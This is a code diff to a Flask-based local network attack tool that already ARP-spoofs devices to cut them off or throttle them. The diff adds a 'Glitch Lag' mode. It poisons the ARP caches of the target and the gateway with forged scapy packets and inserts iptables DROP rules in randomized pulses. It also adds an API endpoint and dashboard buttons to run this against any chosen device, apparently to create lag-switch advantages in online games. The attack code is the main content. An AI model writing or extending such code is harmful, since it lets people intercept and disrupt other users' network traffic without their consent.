@@ -5,6 +5,7 @@ import socket
 import sys
 import json
 import logging
+import random
 from scapy.all import ARP, Ether, IP, ICMP, srp, sendp, conf
 from flask import Flask, jsonify, request, render_template_string
 # Disable Flask startup logging
@@ -22,6 +23,7 @@ state = {
     "devices": [], # list of dicts: {'ip': str, 'mac': str}
     "active_attacks": {}, # dict of ip: threading.Event()
     "active_mtu_limits": {}, # dict of ip: {'event': threading.Event(), 'val': int}
+    "active_lags": {}, # dict of ip: {'event': threading.Event(), 'pulse': int, 'gap': int}
     "solo_lobby_active": False,
     "solo_lobby_expires": 0,
     "solo_lobby_target": None,
@@ -207,6 +209,68 @@ def spoof_loop_with_macs(target_ip, target_mac, gateway_ip, gateway_mac, stop_ev
     except Exception as e:
         print(f"[!] Spoof loop error: {e}")
 
+def glitch_lag_loop(target_ip, gateway_ip, pulse_ms, gap_ms, stop_event):
+    """
+    Repeating Lag Switch:
+    Blocks traffic for a random duration around pulse_ms,
+    then restores it for a random duration around gap_ms.
+    """
+    try:
+        target_mac = get_mac(target_ip)
+        gateway_mac = get_mac(gateway_ip)
+        if not target_mac or not gateway_mac:
+            print(f"[!] Glitch Lag: Could not resolve MACs for {target_ip}")
+            return
+
+        print(f"[+] Glitch Lag active for {target_ip}: Pulse ~{pulse_ms}ms, Gap ~{gap_ms}ms")
+
+        while not stop_event.is_set():
+            # --- PHASE 1: LAG PULSE (DROP) ---
+            # Randomize pulse duration (±30%)
+            actual_pulse = (float(pulse_ms) / 1000.0) * random.uniform(0.7, 1.3)
+            
+            # Drop traffic
+            os.system(f"iptables -I FORWARD 1 -s {target_ip} -j DROP")
+            os.system(f"iptables -I FORWARD 1 -d {target_ip} -j DROP")
+            
+            # Optional: Poison ARP briefly to ensure traffic hits us during the pulse
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), iface=state["iface"], verbose=0)
+            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), iface=state["iface"], verbose=0)
+
+            # Hold the lag
+            start_pulse = time.time()
+            while time.time() - start_pulse < actual_pulse and not stop_event.is_set():
+                time.sleep(0.02)
+
+            # Restore traffic
+            os.system(f"iptables -D FORWARD -s {target_ip} -j DROP")
+            os.system(f"iptables -D FORWARD -d {target_ip} -j DROP")
+            
+            # --- PHASE 2: GAP (CLEAN) ---
+            # Randomize gap duration (±20%)
+            actual_gap = (float(gap_ms) / 1000.0) * random.uniform(0.8, 1.2)
+            
+            # Optional: Fast restoration of ARP
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=2, verbose=0)
+            
+            # Wait for next pulse
+            start_gap = time.time()
+            while time.time() - start_gap < actual_gap and not stop_event.is_set():
+                time.sleep(0.02)
+
+    except Exception as e:
+        print(f"[!] Glitch Lag error: {e}")
+    finally:
+        # Cleanup
+        os.system(f"iptables -D FORWARD -s {target_ip} -j DROP > /dev/null 2>&1")
+        os.system(f"iptables -D FORWARD -d {target_ip} -j DROP > /dev/null 2>&1")
+        # Restore ARP
+        try:
+            sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
+            sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
+        except: pass
+        print(f"[-] Glitch Lag stopped for {target_ip}")
+
 # --- Web API Endpoints ---
 @app.route('/api/status', methods=['GET'])
 def api_status():
@@ -216,12 +280,18 @@ def api_status():
         if d["ip"] in state["active_mtu_limits"]:
             mtu_limit = state["active_mtu_limits"][d["ip"]]["val"]
             
+        is_lagging = d["ip"] in state["active_lags"]
+        lag_info = state["active_lags"].get(d["ip"])
+            
         devices_enriched.append({
             "ip": d["ip"],
             "mac": d["mac"],
             "nickname": state["nicknames"].get(d["mac"], ""),
             "is_cut": d["ip"] in state["active_attacks"],
-            "mtu_limit": mtu_limit
+            "mtu_limit": mtu_limit,
+            "is_lagging": is_lagging,
+            "lag_pulse": lag_info["pulse"] if is_lagging else None,
+            "lag_gap": lag_info["gap"] if is_lagging else None
         })
         
     return jsonify({
@@ -301,6 +371,26 @@ def api_toggle_mtu():
         
     return jsonify({"success": True})
 
+@app.route('/api/toggle_lag', methods=['POST'])
+def api_toggle_lag():
+    target_ip = request.json.get('ip')
+    pulse_ms = request.json.get('pulse', 500)
+    gap_ms = request.json.get('gap', 2000)
+    gateway_ip = state["gateway_ip"]
+    
+    if target_ip == gateway_ip:
+        return jsonify({"error": "Cannot lag the gateway."}), 400
+        
+    if target_ip in state["active_lags"]:
+        state["active_lags"][target_ip]['event'].set()
+        del state["active_lags"][target_ip]
+    else:
+        stop_event = threading.Event()
+        state["active_lags"][target_ip] = {'event': stop_event, 'pulse': pulse_ms, 'gap': gap_ms}
+        threading.Thread(target=glitch_lag_loop, args=(target_ip, gateway_ip, pulse_ms, gap_ms, stop_event), daemon=True).start()
+        
+    return jsonify({"success": True, "is_lagging": target_ip in state["active_lags"]})
+
 @app.route('/api/solo_lobby', methods=['POST'])
 def api_solo_lobby():
     target_ip = request.json.get('ip')
@@ -372,6 +462,7 @@ HTML_TEMPLATE = """
         .badge-cyan  { background:rgba(0,255,209,0.08); color:#00ffd1; border:1px solid rgba(0,255,209,0.4);   box-shadow:0 0 10px rgba(0,255,209,0.25); animation:pulse-cyan 1.4s ease-in-out infinite; }
         .badge-gold  { background:rgba(255,196,0,0.08); color:#ffc400; border:1px solid rgba(255,196,0,0.3); }
         @keyframes pulse-cyan { 0%,100%{box-shadow:0 0 8px rgba(0,255,209,0.3)} 50%{box-shadow:0 0 20px rgba(0,255,209,0.7)} }
+        @keyframes pulse-red { 0%,100%{box-shadow:0 0 8px rgba(255,0,60,0.3)} 50%{box-shadow:0 0 20px rgba(255,0,60,0.7)} }
         .btn { font-family:'Rajdhani',sans-serif; font-weight:700; letter-spacing:.06em; border-radius:3px; cursor:pointer; transition:all .15s; text-transform:uppercase; font-size:.8rem; }
         .btn-red   { background:transparent; color:var(--red);  border:1px solid var(--red);  padding:8px 14px; }
         .btn-red:hover   { background:rgba(255,0,60,0.15);   box-shadow:0 0 12px rgba(255,0,60,0.4); }
@@ -488,6 +579,8 @@ HTML_TEMPLATE = """
         let pendingNicknames = {};
         let pendingTimes = {};
         let pendingMtu = {};
+        let pendingPulses = {};
+        let pendingGaps = {};
         
         let currentSortCol = 'ip';
         let sortDesc = false;
@@ -635,6 +728,8 @@ HTML_TEMPLATE = """
                 if (is_ghosting) {
                     const expireAt = Date.now() + (globalData.solo_lobby_timer * 1000);
                     statusBadge = `<span class="badge badge-cyan">◈ SOLO LOBBY: <span class="ghost-timer mono" data-expire="${expireAt}">${globalData.solo_lobby_timer.toFixed(3)}</span>s</span>`;
+                } else if (dev.is_lagging) {
+                    statusBadge = `<span class="badge badge-red" style="animation: pulse-red 1s infinite;">◈ GLITCH LAG</span>`;
                 } else if (dev.is_cut) {
                     statusBadge = '<span class="badge badge-red">✕ OFFLINE</span>';
                 } else {
@@ -648,10 +743,17 @@ HTML_TEMPLATE = """
                 const actionCutClass = dev.is_cut ? 'btn btn-cyan' : 'btn btn-red';
                 const currentNick = pendingNicknames[dev.mac] !== undefined ? pendingNicknames[dev.mac] : dev.nickname;
                 const currentTime = pendingTimes[dev.ip] !== undefined ? pendingTimes[dev.ip] : "8000";
+                
                 const isMtuActive = dev.mtu_limit !== null;
                 const currentMtuVal = pendingMtu[dev.ip] !== undefined ? pendingMtu[dev.ip] : (isMtuActive ? dev.mtu_limit : "800");
                 const actionMtuText = isMtuActive ? 'STOP MTU' : 'LIMIT MTU';
                 const actionMtuClass = isMtuActive ? 'btn btn-cyan' : 'btn btn-gold';
+
+                const isLagActive = dev.is_lagging;
+                const currentPulse = pendingPulses[dev.ip] !== undefined ? pendingPulses[dev.ip] : (isLagActive ? dev.lag_pulse : "500");
+                const currentGap = pendingGaps[dev.ip] !== undefined ? pendingGaps[dev.ip] : (isLagActive ? dev.lag_gap : "2000");
+                const actionLagText = isLagActive ? 'STOP LAG' : 'GLITCH LAG';
+                const actionLagClass = isLagActive ? 'btn btn-cyan' : 'btn btn-red';
 
                 html += `
                 <div class="device-row" style="border-bottom:1px solid rgba(0,255,209,0.07);padding:14px 16px;display:grid;grid-template-columns:repeat(5,1fr);gap:12px;align-items:center;transition:background .15s;" onmouseover="this.style.background='rgba(0,255,209,0.03)'" onmouseout="this.style.background=''">
@@ -677,22 +779,35 @@ HTML_TEMPLATE = """
                         ${statusBadge}
                     </div>
                     <div class="action-col" style="display:flex;flex-direction:column;align-items:flex-end;gap:6px;">
-                        <button onclick="toggleCut('${dev.ip}')" class="${actionCutClass}" style="width:100%;text-align:center;">${actionCutText}</button>
                         <div style="display:flex;gap:6px;width:100%;">
-                            <input type="number" id="mtu-${dev.ip}" class="hp-input hp-input-sm" style="width:80px;text-align:center;"
-                                value="${currentMtuVal}"
-                                onfocus="focusedInputId = this.id"
-                                onblur="focusedInputId = null"
-                                oninput="pendingMtu['${dev.ip}'] = this.value">
-                            <button onclick="toggleMtu('${dev.ip}', 'mtu-${dev.ip}')" class="${actionMtuClass}" style="flex:1;text-align:center;">${actionMtuText}</button>
-                        </div>
-                        <div style="display:flex;gap:6px;width:100%;">
+                            <button onclick="toggleCut('${dev.ip}')" class="${actionCutClass}" style="flex:1;text-align:center;">${actionCutText}</button>
+                            <button onclick="triggerSoloLobby('${dev.ip}', 'time-${dev.ip}')" ${globalData.solo_lobby_active ? 'disabled' : ''} class="btn btn-blue" style="width:80px;text-align:center;">GHOST</button>
                             <input type="number" id="time-${dev.ip}" class="hp-input hp-input-sm" style="width:80px;text-align:center;"
                                 value="${currentTime}"
                                 onfocus="focusedInputId = this.id"
                                 onblur="focusedInputId = null"
                                 oninput="pendingTimes['${dev.ip}'] = this.value">
-                            <button onclick="triggerSoloLobby('${dev.ip}', 'time-${dev.ip}')" ${globalData.solo_lobby_active ? 'disabled' : ''} class="btn btn-blue" style="flex:1;text-align:center;">GHOST</button>
+                        </div>
+                        <div style="display:flex;gap:6px;width:100%;">
+                            <button onclick="toggleMtu('${dev.ip}', 'mtu-${dev.ip}')" class="${actionMtuClass}" style="flex:1;text-align:center;">${actionMtuText}</button>
+                            <input type="number" id="mtu-${dev.ip}" class="hp-input hp-input-sm" style="width:80px;text-align:center;"
+                                value="${currentMtuVal}"
+                                onfocus="focusedInputId = this.id"
+                                onblur="focusedInputId = null"
+                                oninput="pendingMtu['${dev.ip}'] = this.value">
+                        </div>
+                        <div style="display:flex;gap:6px;width:100%;">
+                            <button onclick="toggleLag('${dev.ip}', 'pulse-${dev.ip}', 'gap-${dev.ip}')" class="${actionLagClass}" style="flex:1;text-align:center;">${actionLagText}</button>
+                            <input type="number" id="pulse-${dev.ip}" class="hp-input hp-input-sm" style="width:70px;text-align:center;" placeholder="Pulse"
+                                value="${currentPulse}"
+                                onfocus="focusedInputId = this.id"
+                                onblur="focusedInputId = null"
+                                oninput="pendingPulses['${dev.ip}'] = this.value">
+                            <input type="number" id="gap-${dev.ip}" class="hp-input hp-input-sm" style="width:70px;text-align:center;" placeholder="Gap"
+                                value="${currentGap}"
+                                onfocus="focusedInputId = this.id"
+                                onblur="focusedInputId = null"
+                                oninput="pendingGaps['${dev.ip}'] = this.value">
                         </div>
                     </div>
                 </div>`;
@@ -731,6 +846,17 @@ HTML_TEMPLATE = """
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ip: ip, mtu: parseInt(mtuVal) || 800})
+            });
+            fetchStatus();
+        }
+
+        async function toggleLag(ip, pulseId, gapId) {
+            const pulse = document.getElementById(pulseId).value;
+            const gap = document.getElementById(gapId).value;
+            await fetch('/api/toggle_lag', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ip: ip, pulse: parseInt(pulse) || 500, gap: parseInt(gap) || 2000})
             });
             fetchStatus();
         }
